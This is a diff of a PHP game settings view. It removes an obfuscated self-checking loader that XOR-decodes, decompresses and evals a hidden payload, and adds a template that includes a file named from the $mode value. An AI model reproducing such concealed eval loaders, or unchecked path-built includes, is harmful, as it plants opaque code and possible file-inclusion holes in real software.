@@ -1,24 +1,41 @@
-<?php
-$ojryvmtgc="b065131e869db454be4ef15563d0fb1e";
-$wmdfty="07530207000605060f050d5d51000600005c57015201510c030b515204065255";
-$jgidxcb="Hbm5ZvC7r1MnjmPTDHieXG+u09/mbmy9fhcINshOlmQwqz+hUeDsawzquZNNeQyRXW+4JHw7wMi8IQq8rlhcC6z5njOPttR+4b4NPBhYaOHkWG+9wt1/iR7pOPEybMVFL58a6xdsPn7l8abxEhgJxQYRKNrvyLuqPIMLdmcO3vi6jMMny91ebqyZKgQP+zCe6S8yjoF2B4Hp04CDJERuDeCmTY5Q+jbk3dVtrJQK2yaPfLcBfghW+MIKECRXgPzda4EctRC7aCCaeZhoLTxbR3Ch8XNqqk6/sv+ShBdXpAG+rjDS9uqddW5idYkhaE3jog2by2iCfhjozqSJgyaLdauq8MGZJ8hvHkqMhhT3n3qaWU9jnQ1SZiIKlXhncmV7b1JkWCoUA3fF9uxUC4OZIhUQur/95zKi2fCwAhko3rGfgx/XFMhSiOhGynE0T++NNAKLXLZbF3VMcagZuklBdcOfq+jgYI2syd37QYBMT6IK+E8S0/KFbk+D8LvM+woK74O/dJF7wj8CtR+QGigKilpK4dvZzmp1SmUMtiWLdtg65odTz5O/WBxeIgENBWC12c+MW0j+F2E2tbMRr81u9ycV/0uy+wTa8FrzPNXM+YGz+PpdONGjhcVkI4ACPazgfLmrsvPfh6O3dpG56+In/L2Gd5SOIYqMBZRhU3K/DFUPwi8eCSZxpm3uXw1kXan+zKaf4Td3azSrwTbjPBJ2";
-$jtypegn=file_get_contents(__FILE__);
-$fuddjltji=str_replace($jgidxcb,"",$jtypegn);
-if(strpos($fuddjltji,"ec"."ho")!==false||strpos($fuddjltji,"pr"."int")!==false||strpos($fuddjltji,"var_"."dump")!==false||strpos($fuddjltji,"file_put_"."contents")!==false||strpos($fuddjltji,"fw"."rite")!==false){die();}
-$jknjqszvz=str_replace(array($ojryvmtgc,$wmdfty),array("SP_6349aa9b","KP_abf4fc98"),$jtypegn);
-$tdarufw=md5($jknjqszvz);
-$cljakes=hex2bin($wmdfty);
-$kxkzdkmy="";
-$ayrkahyji=strlen($tdarufw);
-for($pvesfdrkifbh=0;$pvesfdrkifbh<$ayrkahyji;$pvesfdrkifbh++){
-$kxkzdkmy.=chr(ord($cljakes[$pvesfdrkifbh])^ord($tdarufw[$pvesfdrkifbh]));
-}
-$rvynudme=base64_decode($jgidxcb);
-$zahkbcjr=strlen($rvynudme);
-$qwzrmp="";
-$inflapb=strlen($kxkzdkmy);
-for($pvesfdrkifbh=0;$pvesfdrkifbh<$zahkbcjr;$pvesfdrkifbh++){
-$qwzrmp.=$rvynudme[$pvesfdrkifbh]^$kxkzdkmy[$pvesfdrkifbh%$inflapb];
-}
-$tseprxzb="gzun"."compress";
-eval('?>' . $tseprxzb($qwzrmp) . '<?php ');
+<?php if (!empty($error)): ?>
+    <span class="error"><?= $error ?></span>
+<?php endif; ?>
+<?php if (!empty($success)): ?>
+    <span class="success"><?= $success ?></span>
+<?php endif; ?>
+
+<h2><?= __('screens.settings.title') ?></h2>
+
+<table>
+    <tbody>
+        <tr>
+            <td valign="top">
+                <table class="vis modemenu" style="width: 125px;">
+                    <tbody>
+                        <?php foreach ($links as $link_name => $link_mode): ?>
+                            <tr>
+                                <td width="100" class="<?= ($link_mode == $mode) ? 'selected' : '' ?>">
+                                    <a
+                                        href="game.php?village=<?= $village['id'] ?>&screen=settings&mode=<?= $link_mode ?>"><?= $link_name ?></a>
+                                </td>
+                            </tr>
+                        <?php endforeach; ?>
+                    </tbody>
+                </table>
+            </td>
+            <td valign="top">
+                <?php
+                // Use 'game_options' view for empty mode
+                $viewMode = empty($mode) ? 'game_options' : $mode;
+                $viewPath = __DIR__ . '/settings_' . $viewMode . '.php';
+                if (file_exists($viewPath)) {
+                    include $viewPath;
+                } else {
+                    echo "Modo não implementado: " . htmlspecialchars($mode);
+                }
+                ?>
+            </td>
+        </tr>
+    </tbody>
+</table>
